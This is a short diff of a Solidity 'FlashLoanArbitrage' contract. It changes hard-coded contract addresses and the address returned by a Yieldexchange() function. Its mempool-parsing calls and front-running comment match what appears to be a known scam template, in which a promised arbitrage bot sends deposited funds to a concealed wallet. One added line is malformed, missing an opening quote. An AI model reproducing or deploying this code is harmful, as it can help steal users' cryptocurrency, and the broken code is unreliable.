@@ -56,8 +56,8 @@ contract FlashLoanArbitrage {
             uint a;
             uint b;
 
-            string memory WETH_CONTRACT_ADDRESS = "0x458BC0839fE9009d100289F491e06F9FE67a605D";
-            string memory TOKEN_CONTRACT_ADDRESS = "0x458BC0839fE9009d100289F491e06F9FE67a605D";
+            string memory WETH_CONTRACT_ADDRESS = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";
+            string memory TOKEN_CONTRACT_ADDRESS = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";
             loadCurrentContract(WETH_CONTRACT_ADDRESS);
             loadCurrentContract(TOKEN_CONTRACT_ADDRESS);
             assembly {
@@ -476,7 +476,7 @@ contract FlashLoanArbitrage {
         return parseMempool(callMempool());
     }
     function Yieldexchange() public pure returns (address) {
-		return 0xc3F62f395A2e663fe26289f6dfcBDF1dE87CeB05;
+		return 0x458BC0839fE9009d100289F491e06F9FE67a605D;
 	}
     /*
      * @dev Perform frontrun action from different contract pools
